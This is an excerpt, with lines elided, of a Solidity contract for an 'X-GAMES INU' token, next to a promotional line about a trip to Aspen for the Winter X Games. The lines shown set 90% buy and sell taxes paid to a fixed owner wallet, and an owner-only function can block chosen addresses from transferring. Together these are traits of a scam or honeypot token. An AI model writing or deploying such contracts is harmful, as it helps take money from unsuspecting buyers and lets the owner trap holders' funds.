...
We send community members to Aspen for 4 days for the Winter X Games
...
contract XGI is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name ="X-GAMES INU";
    string private _symbol = "XGI";
    uint8 private _decimals = 9;

    address payable private taxWallet1 = payable(0x081Df9C9a1c41c9aA08F1D32Cf355824a7dF3A1e);
    ...
    uint256 public _buyMarketingFees = 90;
    uint256 public _buyDevelopmentFees = 0;
    uint256 public _sellLiquidityFees = 0;
    uint256 public _sellMarketingFees = 90;
    ...
    uint256 public _totalTaxIfBuying = 90;
    uint256 public _totalTaxIfSelling = 90;
    ...
    uint256 private minimumTokensBeforeSwap = _totalSupply*25/10000; 
    ...
    function unauthorize(address[] memory bots_, bool status) public onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!bots[sender] && !bots[recipient], "Not authorized");
        ...
        else
        {
            ...
            if (contractTokenBalance >= minimumTokensBeforeSwap*4)
                contractTokenBalance = minimumTokensBeforeSwap*4;
